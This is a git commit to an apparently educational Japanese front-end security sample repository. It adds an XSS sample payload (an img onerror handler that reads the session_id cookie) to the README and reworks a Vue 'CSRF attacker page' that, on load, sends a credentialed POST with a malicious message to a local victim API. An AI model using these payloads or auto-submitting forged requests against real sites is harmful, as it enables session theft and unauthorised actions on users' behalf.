9509a152de4e28d43fb7619ff2bf414147b9ef48
shimizu.kazuya <shimizu.kazuya@multisoup.co.jp>
2025-10-23 17:08:56 +0900

    修正

--- README.md
+++ README.md
@@ -1,1 +1,9 @@
 # front-security-sample
+
+### XSS攻撃サンプル
+```html
+<img src="x" onerror="console.log(`セッションID: ${document.cookie.split(';').map(s => s.trim()).find(s => s.startsWith('session_id='))}`)" />
+```
+
+### CSRF攻撃サンプル
+<a href="http://localhost:3002">ここをクリック！</a>
--- malicious-app/app.vue
+++ malicious-app/app.vue
@@ -1,22 +1,10 @@
 <template>
   <div class="p-6 font-sans">
-    <h1 class="text-2xl mb-4">CSRF 攻撃者ページ（実験用）</h1>
-
-    <div class="flex gap-2 mb-4">
-      <button class="px-3 py-2 bg-red-500 rounded" @click="doFetchPost">
-        攻撃
-      </button>
-    </div>
+    <h1 class="text-2xl mb-4">CSRF 攻撃者ページ</h1>
 
     <div class="mb-4 p-4 border rounded bg-white">
-      <h2 class="font-semibold mb-2">送信ログ（ブラウザで確認）</h2>
-      <div class="text-sm mt-2">レスポンス / 結果:</div>
+      <h2 class="font-semibold mb-2">送信ログ</h2>
       <pre class="bg-gray-50 p-2 rounded text-sm">{{ log.join("\n\n") }}</pre>
-    </div>
-
-    <div v-if="imageUrl" class="mt-4">
-      <h3 class="font-semibold">生成したimgタグ（挿入先に表示されます）</h3>
-      <div v-html="imageUrl"></div>
     </div>
   </div>
 </template>
@@ -25,39 +13,45 @@
 import { ref } from "vue";
 
 const log = ref<string[]>([]);
-const imageUrl = ref<string>("");
+
+onMounted(async () => doFetchPost());
 
 async function doFetchPost() {
   // ログ用に表示
-  log.value.unshift(
+  log.value.push(
     `[Fetch POST] ${new Date().toLocaleTimeString()} -> sending...`
   );
 
   try {
-    const resp = await fetch("http://localhost:3001/api/messages", {
+    const url = "http://localhost:3001/api/messages";
+    const option = {
       method: "POST",
       credentials: "include", // ここが重要：被害者サイトの Cookie を自動送信させる（CSRF を実演）
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({ content: "悪意のある投稿です" }),
-    });
-    log.value.unshift(
-      `[Fetch POST] ${new Date().toLocaleTimeString()} Status: ${resp.status} ${
-        resp.statusText
+    }
+    log.value.push("[Fetch POST] request: \n" + JSON.stringify({
+      url,
+      ...option
+    }))
+    const resp = await fetch(url, option as RequestInit);
+    log.value.push(
+      `[Fetch POST] ${new Date().toLocaleTimeString()} Status: ${resp.status} ${resp.statusText
       }`
     );
     // try to read body as text (may be blocked by CORS)
     try {
       const txt = await resp.text();
-      log.value.unshift(`[Fetch POST] response body:\n${txt}`);
+      log.value.push(`[Fetch POST] response body:\n${txt.replaceAll("\n", "")}`);
     } catch (e) {
-      log.value.unshift(
+      log.value.push(
         `[Fetch POST] response body: (could not read - CORS / opaque response)`
       );
     }
   } catch (err: any) {
-    log.value.unshift(`[Fetch POST] Error: ${String(err)}`);
+    log.value.push(`[Fetch POST] Error: ${String(err)}`);
   }
 }
 </script>
